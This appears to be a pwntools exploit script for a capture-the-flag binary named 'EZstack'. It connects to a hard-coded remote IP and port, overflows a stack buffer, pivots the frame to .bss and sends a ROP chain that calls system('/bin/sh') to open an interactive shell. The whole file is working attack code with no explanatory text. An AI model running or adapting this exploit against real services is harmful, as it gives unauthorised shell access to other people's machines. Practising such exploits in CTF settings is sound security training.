from pwn import *

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')
#libc = ELF('./')
#elf = ELF('./')

context.log_level = 'debug'
debug = 0

if debug:
    io = process('./EZstack')
else:
    io = remote('210.30.97.133',28097)

def p():
    gdb.attach(proc.pidof(io)[0])

one_gadget = [0xe3b2e,0xe3b31,0xe3b34]

pop_rdi_ret = 0x000000000040126b # pop rdi ; ret
bss_addr = 0x404f30 
echo_addr = 0x4011B3
system_addr =  0x4011BE
main_addr = 0x4011E4
ret_addr = main_addr
payload = b'/bin/sh\x00' +b'a' *  0x18 + p64(bss_addr + 0x20) + p64(main_addr)
#p()
io.sendafter(b"F**K ME, PLZ!!!",payload)

binsh_addr = bss_addr
payload = b'/bin/sh\x00' # fake_rbp
payload += p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)
payload += p64(bss_addr) + p64(main_addr)
#p()
pause()
io.send(payload)

pause()
io.sendline()


io.interactive()

